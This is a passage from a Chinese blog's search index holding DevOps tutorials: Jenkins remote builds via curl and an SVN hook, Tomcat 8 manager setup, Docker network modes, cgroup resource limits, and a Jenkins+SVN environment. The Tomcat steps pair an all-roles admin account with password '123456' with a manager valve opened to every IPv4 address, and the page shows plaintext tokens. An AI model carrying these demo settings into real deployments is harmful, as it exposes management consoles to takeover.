Jenkins 构建任务页面左边的小窗口（构建历史）内可以看到新创建的构建历史。 获取用户的 crumb 值，使用 CURL 命令触发远程构建时需要用到 一般来说，当在 Jenkins 内启用了” 防止跨站点请求伪造”，且通过 CURL 命令触发远程构建时才需要带上 crumb 值。下面先介绍如何获取某用户的 API Token，因为后续将用到 API Token 的值。 1234567891011# 浏览器输入以下地址获取某用户的crumb值，其中clay是用户名，115613e7bde4a846d49800f9e004cda2e4是上面获取得到的API Tokenhttp://clay:115613e7bde4a846d49800f9e004cda2e4@127.0.0.1:8888/jenkins/crumbIssuer/api/xml# 返回结果为某用户的crumb值&lt;defaultCrumbIssuer _class="hudson.security.csrf.DefaultCrumbIssuer"&gt; &lt;crumb&gt;a2088f0de8aca0d5a05079eed6ea972a&lt;/crumb&gt; &lt;crumbRequestField&gt;Jenkins-Crumb&lt;/crumbRequestField&gt;&lt;/defaultCrumbIssuer&gt;# 以后触发Jenkin远程构建时需要携带的请求消息头为以下值Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a 通过 CURL 命令触发远程构建 1234567# 首先按照上面的操作，配置远程触发构建，并获取某用户的crumb值# 命令的格式# curl -X post -v -u [Jenkins 用户名]:[Jenkins 密码] -H "请求消息头信息" http://[Jenkins 服务器IP地址]:[Jenkins 服务器端口号]/jenkins/job/[Jenkins 项目名称]/build?token=[API Token]# 完整的CURL命令，构建成功后在Jenkins构建任务左边的小窗口（构建历史）内可以看到新创建的构建历史# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 配置 SVN 钩子程序 12345678910111213# 连接Docker容器（SVN）# docker exec -it jenkins-svn-httpd /bin/bash# 进入SVN仓库jenkins-repo的hooks目录，并创建钩子程序（不带.tmpl后缀）,然后赋予可执行的权限# cd /var/lib/svn/jenkins-repo/hooks# cp post-commit.tmpl post-commit# chmod 755 post-commit# 编辑post-commit文件，将文件原有的内容都注释掉，然后在文件末尾追加CURL命令# 注意，由于SVN与Jenkins服务都部署在Docker容器内，因此这里CURL命令中的服务器IP不能是127.0.0.1，必须是Jenkins服务所在Docker容器的IP# vim post-commit# "$REPOS"/hooks/mailer.py commit "$REPOS" $REV "$REPOS"/mailer.conf# curl -X post -v -u clay:123456 -H "Jenkins-Crumb:a2088f0de8aca0d5a05079eed6ea972a" http://127.0.0.1:8888/jenkins/job/jenkins-study/build?token=yOEBc7Dcd4duKSNt 验证 SVN 钩子程序是否生效 Eclipse 内修改 Maven 项目 jenkins-study 的代码，然后将代码提交到 SVN 仓库，观察 Jenkins 构建任务页面左边的小窗口（构建历史）内是否有新构建历史出现，如果有则说明 SVN 钩子程序生效了。 Jenkins 常规构建流程总结 下篇：Jenkins 入门教程之四 Jenkins 与 Git 持续集成实战 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd"},{title:"Centos7 安装图片处理软件 GIMP",url:"/posts/3cf5ae19.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux GIMP 安装 GIMP 算得上是 Linux 系统下的 Photoshop，基于 GTK 编写的图像编辑处理软件，功能非常强大。 1234567891011121314# 安装EPEL源# yum install epel-release# 查看源# ls /etc/yum.repos.d/# 更新源# yum clean all &amp;&amp; yum makecache# 安装基础依赖包# yum install aalib aalib-devel libexif-devel libjpeg-devel libpng-devel# 安装GIMP# yum install gimp mtPaint 安装 mtPaint 是 Linux 下的一款优秀的画图软件，推荐安装使用。 1# yum install mtpaint Shutter 安装 Shutter 是一款 Linux 截图工具，支持截图后自动保存、自动复制到剪切板、并且可以编辑，可以说是 Linux 下最强大的截图工具，推荐安装使用。安装后可以添加系统快捷键，名称：shotcut，命令：shutter -s，快捷键：Ctrl+Alt+A。 12345# 安装源# rpm -Uvh http://li.nux.ro/download/nux/dextop/el7/x86_64/nux-dextop-release-0-5.el7.nux.noarch.rpm# 安装# yum install -y shutter var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Tomcat 常用配置详解",url:"/posts/f77da043.html",text:'Tomcat8 配置管理用户 12345678910111213141516171819202122232425262728293031323334# 编辑Tomcat8对应的配置文件，在&lt;tomcat-users&gt;标签内添加以下内容，配置Tomcat的管理用户# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# 编辑manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 编辑host-manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 重启Tomcat服务器使配置生效# 注意：# 关于如何Tomcat配置管理用户，不同版本的Tomcat配置方法有差异，上面仅演示Tomcat8版本的配置方法。# 由于Tomcat8默认启用了网段限制，默认只有127网段局域网的机器才拥有有访问权限，如果是其他网段登陆，如172，10网段会报403错误，因此需要按照上面的方法修改对应的context.xml配置文件。# 出于安全考虑，在生产环境中建议启用默认的网段限制，即只允许在本地访问Tomcat服务器的管理页面。# Tomcat8共有6种权限（包括文档中说明了4种以及host-manager页面出错提示的2种），具体如下：# admin-gui&nbsp;— 可访问 "host管理" 页面，但"APP管理" 和 "服务器状态" 页面无查看权限# manager-gui&nbsp;— 无 "host管理" 页面访问权限，有"APP管理" 和 "服务器状态" 页面查看权限# manager-status&nbsp;— 只有"服务器状态" 页面查看权限# manager-script&nbsp;— 有脚本方式管理接口访问权限和"服务器状态" 页面查看权限# manager-jmx&nbsp;— JMX 代理接口访问权限和"服务器状态" 页面查看权限# admin-script&nbsp;— 只有host-manager脚本方式管理接口访问权限 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"web服务器"},{title:"OpenStack 之一 OpenStack 介绍",url:"/posts/fcb4fc9d.html",text:'IaaS，PaaS，SaaS 的区别 主流的云计算平台 OpenStack、CloudStack、Eucalyptus、vCloud Director var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Docker 之十四 Docker 四大网络模式",url:"/posts/e6921476.html",text:'Docker 四大网络模式 桥接模式、主机模式、容器模式、无网络模式 Docker 四大网络模式之一（bridge） 该模式是 Docker 的默认设置，Docker 守护进程创建了一个虚拟以太网桥 docker0，附加在其上的任何网卡之间都能自动转发数据包。默认情况下，守护进程会创建一对对等接口，将其中一个接口设置为容器的 eth0 接口，另一个接口放置在宿主机的命名空间中，从而将宿主机上的所有容器都连接到这个内部网络上。守护进程还会从网桥的私有地址空间中分配一个 IP 地址和子网给该容器。注意启动容器的时候需要指定 - p（固定端口分配） 或者 -P（动态端口分配）参数来暴露端口，否则 IP 数据包就不能从宿主机之外路由到容器中。 1234567891011# docker run -d -p 8888:8080 --net=bridge --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES223e6aee4801 tomcat:8 "catalina.sh run" 23 seconds ago Up 21 seconds 0.0.0.0:8888-&gt;8080/tcp tomcat8# 查看宿主机的虚拟网桥列表# brctl showbridge name bridge id STP enabled interfacesdocker0 8000.0242e6d2901f no veth3074090 Docker 四大网络模式之二（host） 该模式将禁用 Docker 容器的网络隔离，因为容器共享了宿主机的 Network Namespace，直接暴露在公共网络中。容器将不会虚拟出自己的网卡和配置自己的 IP 等，即容器直接使用宿主机的 IP 和端口。该模式比 bridge 模式更快（因为没有路由开销），但是它将容器直接暴露在公共网络中，存在安全隐患。 1234567891011121314151617# docker run -d --net=host --name=tomcat8 tomcat:8# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES363792e07323 tomcat:8 "catalina.sh run" 6 minutes ago Up 6 minutes tomcat8# 查看宿主机的IP信息# ip addr | grep -A 2 eth0:2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0# 查看容器的IP信息，可以发现容器和宿主机具有相同的IP地址192.168.1.130# docker exec -it tomcat8 ip addr2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 0c:c4:7a:ab:b8:36 brd ff:ff:ff:ff:ff:ff inet 192.168.1.130/24 brd 192.168.1.255 scope global noprefixroute dynamic eth0 Docker 四大网络模式之三（container） 该模式会重用另一个容器的网络命名空间。通常来说，当你想要自定义网络栈时，该模式是很有用的。实际上，该模式也是 Kubernetes 使用的网络模式。 12345678910111213141516171819# 以桥接模式启动第一个容器# docker run -d -p 8888:8080 --net=bridge --name="tomcat8-1" tomcat:8# 查看第一个容器的IP信息# docker exec -it tomcat8-1 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever# 以container模式启动第二个容器，同时指定重用第一个容器的网络命名空间；注意此时两个容器内的Tomcat服务器不能使用相同的监听端口，否则会造成端口冲突导致Tomcat容器启动失败# docker run -d --net="container:tomcat8-1" --name="tomcat8-2" tomcat:8# 查看第二个容器的IP信息，可以发现与第一个容器的IP地址一样都是172.17.0.2# docker exec -it tomcat8-2 ip addr107: eth0@if108: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0 valid_lft forever preferred_lft forever Docker 四大网络模式之四（none） 该模式将容器放置在它自己的网络栈中，但是并不进行任何配置。实际上该模式关闭了容器的网络功能，此模式在以下两种情况下是有用的，第一种是容器并不需要网络（例如只需要写磁盘卷的批处理任务），第二种是希望自己自定义网络。 123456789# docker run -d -p 8888:8080 --net=none --name=tomcat8 tomcat:8# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4b4b90aa1a98 tomcat:8 "catalina.sh run" 2 seconds ago Up 1 second tomcat8# docker inspect tomcat8 | grep IPAddress"SecondaryIPAddresses": null,"IPAddress": "", Docker 网络安全 Docker 可以开启容器间通信（意味着默认配置–icc=true），也就是说，宿主机上的所有容器可以不受任何限制地相互通信，这可能导致拒绝服务攻击。进一步地，Docker 可以通过–ip_forward 和–iptables 两个选项控制容器间、容器和外部世界的通信。应该多了解这些选项的默认值，并让网络组根据公司策略设置 Docker 进程。 Docker 容器分配固定 IP 1234567891011121314151617181920212223# 创建自定义网络（网桥），这里子网掩码使用255.255.255.0，也就是IP后面的数字24# docker network create --subnet=172.170.0.0/24 jenkins-network# 可使用以下命令删除自定义网络（网桥）# docker network rm jenkins-network# 查看Docker的网桥列表# docker network lsNETWORK ID NAME DRIVER SCOPE14c2653a88a2 bridge bridge localf44c2671ffd1 host host local007c22522504 jenkins-network bridge local03b720dc8c80 none null local# 创建并启动容器，指定自定义网络（网桥）、IP# docker run -d --net jenkins-network --ip 172.170.0.5 -p 9126:80 -p 4690:3690 --name jenkins-svn-httpd clay/jenkins-svn-httpd:1.1# 查看容器的IP# docker exec -it jenkins-svn-httpd ip addr49: eth0@if50: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:aa:00:05 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.170.0.5/24 brd 172.170.0.255 scope global eth0 valid_lft forever preferred_lft forever var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Docker 之十三资源隔离与资源限制介绍",url:"/posts/d1859c90.html",text:'虚拟机与容器底层实现的对比 虚拟机与容器的底层实现原理是不同的，正如上图片的对比。虚拟机实现资源隔离的方法是利用一个独立的 Guest OS，并利用 Hypervisor 虚拟化 CPU、内存、IO 设备等实现的。例如，为了虚拟化内存，Hypervisor 会创建一个 shadow page table，正常情况下，一个 page table 可以用来实现从虚拟内存到物理内存的翻译。相比虚拟机实现资源和环境隔离的方案，Docker 就显得简练很多，它不像虚拟机一样重新加载一个操作系统内核，引导、加载操作系统内核是一个比较耗时而又消耗资源的过程，Docker 是利用 Linux 内核特性（LXC）实现的隔离，运行容器的速度几乎等同于直接启动进程。 Linux Namespace 的六大类型 Docker 资源隔离与资源限制的实现原理 使用 Namespace 实现了系统环境的隔离， Namespace 允许一个进程以及它的子进程从共享的宿主机内核资源（Uts、Ipc、、Network、Pid、Mount、User 等）里获得一个仅自己可见的隔离区域，让同一个 Namespace 下的所有进程感知彼此变化，对外界进程一无所知，仿佛运行在一个独占的操作系统中。 使用 CGroups 限制这个环境的资源使用情况，比如一台 16 核 32GB 的机器上只让容器使用 2 核 4GB。使用 CGroups 还可以为资源设置权重，计算使用量，操控任务（进程或线程）启停等。 使用镜像管理功能，利用 Docker 的镜像分层、写时复制、内容寻址、联合挂载技术实现了一套完整的容器文件系统及运行环境，再结合镜像仓库，镜像可以快速下载和共享，方便在多环境部署。 Docker 隔离性的陷阱 Docker 是利用 CGroups 实现资源限制的，只能限制资源消耗的最大值，而不能隔绝其他程序占用自己的资源。 Namespace 的 6 项隔离看似完整，实际上依旧没有完全隔离 Linux 资源，比如 /proc 、/sys 、/dev/sd * 等目录未完全隔离，SELinux、time、syslog 等所有现有 Namespace 之外的信息都未隔离。 由于 /proc 、/sys 、/dev/sd * 等目录未完全隔离，如果在 Docker 容器中执行 top、free 等命令，会发现看到的资源使用情况都是宿主机的资源情况，而很多情况下需要知道的是这个容器被限制了多少 CPU、内存、当前容器内的进程使用了多少。这就导致程序运行在容器里面，调用 API 获取系统内存、CPU，取到的是宿主机的资源大小。同时对于多进程程序，一般都可以将 worker 数量设置成 auto，自适应系统 CPU 核数，但在容器里面这么设置，取到的 CPU 核数是不正确的，例如 Nginx，其他应用取到的可能也不正确，需要进一步测试。 Docker 隔离性陷阱原因分析 当启动一个容器时候，Docker 会调用 libcontainer 实现对容器的具体管理，包括创建 Uts、Ipc、、Net、Pid、Mount、User 等 Namespace 实现容器之间的隔离和利用 CGroups 实现对容器的资源限制。在其中，Docker 会将宿主机一些目录以只读方式挂载到容器中，其中包括 /proc、/dev、/dev/shm、/sys 目录，同时还会建立以下几个链接，保证系统 IO 不会出现问题，这也是为什么在容器里面取到的是宿主机资源原因。 1234/proc/self/fd-&gt;/dev/fd/proc/self/fd/0-&gt;/dev/stdin/proc/self/fd/1-&gt;/dev/stdout/proc/self/fd/2-&gt;/dev/stderr Docker 容器内，JVM 堆内存陷阱 JVM 默认的最大 Heap 大小是系统内存的 1/4，假若物理机内存为 10G，如果你不手动指定 Heap 大小，则 JVM 默认 Heap 大小就为 2.5G。JavaSE8 (&lt;8u131) 版本前还没有针对在容器内执行高度受限的 Linux 进程进行优化，JDK1.9 以后开始正式支持容器环境中的 CGroups 内存限制，JDK1.10 这个功能已经默认开启，可以查看相关 Issue。熟悉 JVM 内存结构的人都清楚，JVM Heap 是一个只增不减的内存模型，Heap 的内存只会往上涨，不会下降。在容器里面使用 Java，如果为 JVM 未设置 Heap 大小，Heap 取得的是宿主机的内存大小，当 Heap 的大小达到容器内存大小时候，就会触发系统对容器 OOM，Java 进程会异常退出。常见的系统日志打印如下： 1234567memory: usage 2047696kB, limit 2047696kB, failcnt 23543memory+swap: usage 2047696kB, limit 9007199254740991kB, failcnt 0......Free swap = 0kBTotal swap = 0kB......Memory cgroup out of memory: Kill process 18286 (java) score 933 or sacrifice ... Docker 容器内，手动设置 Java 应用的堆内存大小 12345# 对于JavaSE8(&lt;8u131)版本，可以在创佳并启动容器的时候，通过环境变量传参确切限制最大Heap大小# docker run -d -m 800M -e JAVA_OPTIONS=\'-Xmx300m\' openjdk:8-jdk-alpine# 对于JavaSE8(&gt;8u131)版本，可以使用上面手动指定最大堆大小，也可以使用下面办法，设置自适应容器内存限制# docker run -d -m 800M -e JAVA_OPTIONS=\'-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MaxRAMFraction=1\' openjdk:8-jdk-alpine 从 CGroups 中正确读取容器资源信息 Docker 在 1.8 版本以后会将分配给容器的 CGroups 信息挂载进容器内部，容器里面的程序可以通过解析 CGroups 信息获取到容器资源信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 查看容器内的挂载记录# cat /etc/mtabcgroup /sys/fs/cgroup/systemd cgroup ro,seclabel,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd 0 0cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,net_prio,net_cls 0 0cgroup /sys/fs/cgroup/cpuset cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuset 0 0cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,seclabel,nosuid,nodev,noexec,relatime,cpuacct,cpu 0 0cgroup /sys/fs/cgroup/perf_event cgroup ro,seclabel,nosuid,nodev,noexec,relatime,perf_event 0 0cgroup /sys/fs/cgroup/memory cgroup ro,seclabel,nosuid,nodev,noexec,relatime,memory 0 0cgroup /sys/fs/cgroup/hugetlb cgroup ro,seclabel,nosuid,nodev,noexec,relatime,hugetlb 0 0cgroup /sys/fs/cgroup/freezer cgroup ro,seclabel,nosuid,nodev,noexec,relatime,freezer 0 0cgroup /sys/fs/cgroup/blkio cgroup ro,seclabel,nosuid,nodev,noexec,relatime,blkio 0 0cgroup /sys/fs/cgroup/pids cgroup ro,seclabel,nosuid,nodev,noexec,relatime,pids 0 0cgroup /sys/fs/cgroup/devices cgroup ro,seclabel,nosuid,nodev,noexec,relatime,devices 0 0# 获取已使用内存的大小（USAGE）# cat /sys/fs/cgroup/memory/memory.usage_in_bytes4289953792# 获取内存限制的大小（LIMIT）# cat /sys/fs/cgroup/memory/memory.limit_in_bytes4294967296# 获取磁盘I/O状况# cat /sys/fs/cgroup/blkio/blkio.throttle.io_service_bytes7:0 Read 122887:0 Write 07:0 Sync 07:0 Async 122887:0 Total 12288......# 获取容器虚拟网卡入口流量# cat /sys/class/net/eth0/statistics/rx_bytes10167967741# 获取容器虚拟网卡出口流量# cat /sys/class/net/eth0/statistics/tx_bytes15139291335# 获取容器内是否被设置了OOM，是否发生过OOM# cat /sys/fs/cgroup/memory/memory.oom_controloom_kill_disable 0under_oom 0# oom_kill_disable默认为0，表示打开了oom killer，就是当内存超时会触发kill进程。可以在使用docker run时候指定disable oom，将此值设置为1，关闭oom killer；# under_oom 这个值仅仅是用来看的，表示当前的CGroups的状态是不是已经oom了，如果是，这个值将显示为1。 LXCFS 使用 由于习惯性等原因，在容器中使用 top、free 等命令仍然是一个较为普遍存在的需求，但是容器中的 /proc、/sys 目录等还是挂载的宿主机目录。开源项目 LXCFS 是基于 FUSE 实现的一套用户态文件系统，使用 LXCFS 可以实现在容器内继续使用 free 等命令。但是 LXCFS 目前只支持为容器生成下面列表中的文件，如果命令是通过解析这些文件实现的，那么在容器里面可以继续使用，否则只能通过读取 CGroups 获取资源情况。如果对从容器中如何读取 CGroups 信息感兴趣，可以了解 docker stats 的源码实现。 123456/proc/cpuinfo/proc/diskstats/proc/meminfo/proc/stat/proc/swaps/proc/uptime Docker 资源限制配置 https://blog.csdn.net/candcplusplus/article/details/53728507 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Jenkins 入门教程之二 Jenkins 与 SVN 搭建 CI-CD 环境",url:"/posts/44bda657.html",text:'前言 本教程实战演示基于 SVN + Jenkins + Maven + JDK + Docker 搭建 CI/CD 环境，其中 SVN 基于 Debian 镜像手动安装，而 Jenkins、Maven、JDK 则基于 Tomcat 镜像手动安装。如果仅为了快速体验使用 Jenkins 的功能，可以直接 Pull Jenkins 官方的 Docker 镜像，然后创建并启动 Docker 容器来体验 Jenkins 相关功能，此时可忽略下面教程中的大部分操作步骤。 Docker 环境安装与配置 站内教程：Docker 介绍与安装 基于 Docker 搭建 SVN 服务器 站内教程：通过 Apache、Subversion 搭建 SVN 服务器，实现使用 HTTP/SVN 协议访问 SVN 仓库 123456789101112131415161718192021# 拉取Debian镜像# docker pull debian# 创建并启动容器，80是Apache端口，3690是Subversion端口，/var/lib/svn是所有SVN仓库的父目录# docker run -it -p 9126:80 -p 4690:3690 --name svn-httpd \\ -v /container/svn-server:/var/lib/svn \\ -d debian# 连接容器# docker exec -it svn-httpd /bin/bash# 修改系统时间# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# 参考上面给出的本站教程，使用Apache、Subversion搭建SVN服务器# 断开容器连接，不停止运行容器# ctrl + p + q# 最后如果Subversion容器能正常工作，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-svn-httpd image" svn-httpd clay/jenkins-svn-httpd:1.0 基于 Docker 搭建 Tomcat 服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# 拉取Tomcat8的镜像# docker pull tomcat:8# 创建并启动容器# docker run -p 8888:8080 --name tomcat8 \\ -v /container/tomcat8/logs:/usr/local/tomcat/logs \\ -d tomcat:8# 连接容器# docker exec -it tomcat8 /bin/bash# 更新系统并安装常用软件，Docker官方的Tomcat镜像默认安装了Open-JDK、Tomcat Native、APR，具体安装细节可以参考官方镜像的Dockerfile文件# apt-get -y update# apt-get -y upgrade# apt-get -y install git vim htop telnet net-tools# 修改系统时间# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime# 配置Tomcat8的管理用户，编辑Tomcat8对应的配置文件，在&lt;tomcat-users&gt;标签内添加以下内容# vim /usr/local/tomcat/conf/tomcat-users.xml&lt;tomcat-users&gt; &lt;role rolename="admin-gui"/&gt; &lt;role rolename="admin-script"/&gt; &lt;role rolename="manager-gui"/&gt; &lt;role rolename="manager-script"/&gt; &lt;role rolename="manager-jmx"/&gt; &lt;role rolename="manager-status"/&gt; &lt;user username="admin" password="123456" roles="admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/&gt;&lt;/tomcat-users&gt;# 关于Tomcat配置管理用户，不同版本的Tomcat配置方法有差异，上面仅演示Tomcat8版本的配置方法。# 由于Tomcat8默认启用了网段限制，默认只有127网段局域网的机器才拥有有访问权限，如果是其他网段登陆，如172，10网段会报403错误，因此需要按照下面的方法修改对应的context.xml配置文件。# 出于安全考虑，在生产环境中建议启用默认的网段限制，即只允许在本地访问Tomcat服务器的管理页面。# 编辑manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 编辑host-manager项目下的META-INF/context.xml配置文件，将&lt;Valve&gt;标签的内容替换为以下文本# vim /usr/local/tomcat/webapps/host-manager/META-INF/context.xml&lt;Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="\\d+\\.\\d+\\.\\d+\\.\\d+|::1|0:0:0:0:0:0:0:1" /&gt;# 断开容器连接# exit# 重启容器使配置生效# docker restart tomcat8# 通过浏览器访问Tomcat的管理页面，测试是否配置成功# 最后如果Tomcat容器能正常工作，建议执行commit操作生成Docker备份镜像# docker commit -a "clay@gmail.com" -m "commit jenkins-server image" tomcat8 clay/jenkins-server:1.0 Tomcat 容器内安装与配置 Oracle JDK、Maven 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# 提示：这里安装的Oracle JDK、Maven，在后面Jenkins的全局工具配置中会用到# 连接容器# docker exec -it tomcat8 /bin/bash# 下载Oracle JDK8# wget -P /usr/local --no-cookies --no-check-certificate --header "Cookie: gpw_e24=http%3a%2F%2Fwww.oracle.com%2Ftechnetwork%2Fjava%2Fjavase%2Fdownloads%2Fjdk8-downloads-2133151.html; oraclelicense=accept-securebackup-cookie;" "https://download.oracle.com/otn-pub/java/jdk/8u201-b09/42970487e3af4f5aa5bca3f542482c60/jdk1.8.0_201-linux-x64.tar.gz"# 解压Oracle JDK8# tar -xvf /usr/local/jdk1.8.0_201-linux-x64.tar.gz# 下载Maven# wget -P /usr/local/ http://mirrors.shu.edu.cn/apache/maven/maven-3/3.6.0/binaries/apache-maven-3.6.0-bin.tar.gz# 解压Maven# tar -xvf /usr/local/apache-maven-3.6.0-bin.tar.gz# 删除下载文件# rm /usr/local/jdk1.8.0_201-linux-x64.tar.gz# rm /usr/local/apache-maven-3.6.0-bin.tar.gz# 创建Java命令的软链接，如果安装了Open-JDK，会覆盖Open-JDK相关命令# ln -s -f /usr/local/jdk1.8.0_201/bin/java /usr/bin/java# ln -s -f /usr/local/jdk1.8.0_201/bin/javac /usr/bin/javac# 配置JDK、Maven的环境变量，在配置文件末尾追加以下内容即可# 注意，在/etc/profile配置文件中添加环境变量后，重启Docker容器后环境变量会失效，建议在DockerFile中添加环境变量，然后通过DockerFile构建得到Docker镜像# vim 